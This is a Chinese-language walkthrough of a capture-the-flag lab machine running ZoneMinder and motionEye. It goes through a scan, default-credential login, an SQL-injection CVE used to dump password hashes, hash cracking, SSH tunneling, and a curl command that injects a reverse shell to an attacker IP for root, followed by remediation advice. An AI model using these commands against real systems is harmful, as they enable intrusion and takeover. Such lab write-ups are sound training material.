# CCTV 靶机渗透测试报告

## 目标信息

| 项目 | 详情 |
|------|------|
| **目标 IP** | 10.129.26.46 |
| **主机名** | cctv.htb |
| **操作系统** | Ubuntu Linux 6.8.0 |
| **难度** | 中等 |
| **攻击路径** | Web 应用 → SSH → 本地提权 |

---

## 信息收集

### 端口扫描

```bash
nmap -sV 10.129.26.46
```

**发现端口：**

| 端口 | 服务 | 版本 |
|------|------|------|
| 22/tcp | SSH | OpenSSH 9.6p1 Ubuntu |
| 80/tcp | HTTP | Apache 2.4.58 |
| 443/tcp | Closed | - |

### Web 服务分析

访问 http://10.129.26.46/zm/ 发现 **ZoneMinder** CCTV 管理系统

**关键发现：**
- ZoneMinder 版本：1.37.63
- 登录页面：http://cctv.htb/zm/
- API 端点需要认证（返回 401）

---

## 漏洞利用

### 1. ZoneMinder SQL 注入 (CVE-2024-51482)

**漏洞信息：**

| 项目 | 详情 |
|------|------|
| CVE | CVE-2024-51482 |
| 类型 | 认证型时间盲注 SQL 注入 |
| 影响版本 | ZoneMinder v1.37.* ≤ 1.37.64 |
| CVSS | 9.9 CRITICAL |
| 位置 | web/ajax/event.php removetag action |

**利用过程：**

1. 使用默认凭据 `admin/admin` 登录 ZoneMinder
2. 使用 PoC 工具 [plur1bu5/CVE-2024-51482-PoC](https://github.com/plur1bu5/CVE-2024-51482-PoC) 提取数据库用户表

**获取的用户凭据哈希：**

```
admin:$2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm
mark:$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.
superadmin:$2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m
```

### 2. 密码破解

使用 John the Ripper 配合自定义字典破解 bcrypt 哈希：

```bash
john --wordlist=zm_words.txt --format=bcrypt zm_hashes.txt
```

**破解结果：**

| 用户 | 密码 |
|------|------|
| mark | opensesame |
| superadmin | admin |
| admin | (未破解) |

### 3. SSH 登录

```bash
ssh mark@10.129.26.46
# 密码: opensesame
```

**登录信息：**
- 用户：mark
- 系统：Ubuntu Linux
- 主机名：cctv

---

## 横向移动

### 本地端口扫描

通过 SSH 登录后扫描本地服务：

```bash
ss -tlnp
```

**发现内部服务：**

| 端口 | 服务 | 说明 |
|------|------|------|
| 3306 | MySQL | 数据库 |
| 8554 | RTSP | 视频流 |
| 8765 | HTTP | motionEye 管理界面 |
| 9081 | HTTP | MJPEG 视频流 |
| 7999 | HTTP | motion 配置界面 |
| 1935 | RTMP | 视频流服务 |

### 建立 SSH 隧道

```bash
ssh -L 7999:127.0.0.1:7999 -L 8765:127.0.0.1:8765 -L 9081:127.0.0.1:9081 mark@10.129.26.46
```

### motionEye 服务分析

访问 http://127.0.0.1:8765 发现 **motionEye 0.43.1b4**

motionEye 配置文件位置：`/etc/motioneye/config.yml`

**发现的凭据：**
```
admin_username: admin
admin_password: 989c5a8ee87a0e9521ec81a79187d162109282f0 (SHA1)
```

---

## 权限提升

### CVE-2025-60787 - motionEye 命令注入 RCE

**漏洞信息：**

| 项目 | 详情 |
|------|------|
| CVE | CVE-2025-60787 |
| 类型 | OS 命令注入 RCE |
| CVSS | 7.2 HIGH |
| 影响版本 | motionEye < 特定版本 |
| 利用条件 | 需要 admin 认证 |

**利用步骤：**

1. 通过 motion 配置界面 (端口 7999) 进行未授权配置修改

2. 开启图片输出：
```bash
curl "http://127.0.0.1:7999/1/config/set?picture_output=on"
```

3. 注入恶意命令到 picture_filename 参数：
```bash
curl "http://127.0.0.1:7999/1/config/set?picture_filename=\$(bash -c 'bash -i >\& /dev/tcp/10.10.17.78/4444 0>\&1')"
```

4. 触发命令执行：
```bash
curl "http://127.0.0.1:7999/1/config/set?emulate_motion=on"
```

5. 监听获得反弹 shell：
```bash
nc -lvnp 4444
```

**结果：成功获取 root 权限！**

---

## 获取 Flag

```
cat /root/root.txt 2>/dev/null
cat /home/*/user.txt 2>/dev/null
```

### user.txt (sa_mark 用户)

```
d9e17d8dce8d80250d2b8ecf90868447
```

### root.txt

```
d4663f1faba9eab48cf74bc8bab8771b
```

---

## 漏洞总结

| 漏洞 | CVE | 类型 | 严重性 | 状态 |
|------|-----|------|--------|------|
| ZoneMinder SQL 注入 | CVE-2024-51482 | SQL Injection | Critical | 已利用 |
| motionEye 命令注入 | CVE-2025-60787 | RCE | High | 已利用 |

---

## 攻击链总结

```
端口扫描 → ZoneMinder 发现
    ↓
默认凭据登录 (admin/admin)
    ↓
CVE-2024-51482 SQL 注入 → 提取用户哈希
    ↓
密码破解 → mark/opensesame
    ↓
SSH 登录 → 本地端口扫描
    ↓
发现 motionEye 服务 (7999)
    ↓
CVE-2025-60787 命令注入 → 获取 root shell
    ↓
读取 flag
```

---

## 修复建议

1. **ZoneMinder 升级至 1.37.65+** - 修复 SQL 注入漏洞
2. **motionEye 升级至最新版本** - 修复命令注入漏洞
3. **更改默认/弱密码** - 避免使用常见密码如 `admin`、`opensesame`
4. **限制内部服务访问** - 将内部服务绑定到 127.0.0.1
5. **网络隔离** - 限制 SSH 和 Web 管理界面的访问来源

---

## 时间线

| 阶段 | 操作 |
|------|------|
| 信息收集 | 端口扫描、服务识别 |
| 初始访问 | 默认凭据 + SQL 注入 |
| 密码破解 | John the Ripper |
| 横向移动 | SSH 隧道、本地服务发现 |
| 权限提升 | motionEye 命令注入 RCE |
| 目标达成 | 获取 user.txt 和 root.txt |

---

**靶机：cctv.htb (10.129.26.46)**
**完成时间：约 3 小时**
